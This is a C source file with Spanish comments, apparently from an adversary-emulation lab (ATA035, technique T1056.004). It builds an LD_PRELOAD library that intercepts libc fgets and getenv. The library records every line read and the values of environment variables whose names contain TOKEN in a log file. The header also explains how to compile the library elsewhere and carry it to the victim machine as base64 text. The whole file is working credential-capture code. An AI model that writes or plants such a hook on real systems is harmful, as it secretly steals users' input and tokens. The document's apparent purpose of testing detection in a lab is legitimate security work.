/* ATA035 · T1056.004 Credential API Hooking — hook LD_PRELOAD (libreria)
 * ----------------------------------------------------------------------------
 * Libreria que INTERCEPTA llamadas a la API de libc (`fgets`, `getenv`) del
 * proceso de laboratorio y REGISTRA lo capturado en un log. Es la prueba del
 * "hook" de API para capturar credenciales simuladas.
 *
 * Se compila FUERA de la victima (que no tiene `gcc`) y se transporta como
 * `ATA035_hook.so.b64` (texto) -> la victima la decodifica con `base64 -d`.
 * NO contiene secretos: la ruta del log es del laboratorio.
 *
 * Compilar (en la maquina con toolchain, p. ej. el manager):
 *   gcc -shared -fPIC -O2 -o hook.so ATA035_hook.c -ldl
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define HOOK_LOG "/home/angel/lab-attack/ATA035/hook_capture.log"

static __thread int in_hook = 0;

static void logcap(const char *tag, const char *val) {
    if (in_hook) return;
    in_hook = 1;
    int fd = open(HOOK_LOG, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd >= 0) {
        char buf[2048];
        int n = snprintf(buf, sizeof buf, "%s %s\n", tag, val ? val : "");
        if (n > 0) {
            if (n > (int)sizeof buf) n = (int)sizeof buf;
            if (write(fd, buf, (size_t)n) < 0) { /* best effort */ }
        }
        close(fd);
    }
    in_hook = 0;
}

char *fgets(char *s, int size, FILE *stream) {
    static char *(*real_fgets)(char *, int, FILE *) = NULL;
    static int resolving = 0;
    if (!real_fgets) {
        if (resolving) return NULL;
        resolving = 1;
        real_fgets = (char *(*)(char *, int, FILE *))dlsym(RTLD_NEXT, "fgets");
        resolving = 0;
    }
    char *r = real_fgets(s, size, stream);
    if (r) logcap("fgets", s);
    return r;
}

char *getenv(const char *name) {
    static char *(*real_getenv)(const char *) = NULL;
    static int resolving = 0;
    if (!real_getenv) {
        if (resolving) return NULL;
        resolving = 1;
        real_getenv = (char *(*)(const char *))dlsym(RTLD_NEXT, "getenv");
        resolving = 0;
    }
    char *v = real_getenv(name);
    if (name && v && strstr(name, "TOKEN")) logcap(name, v);
    return v;
}
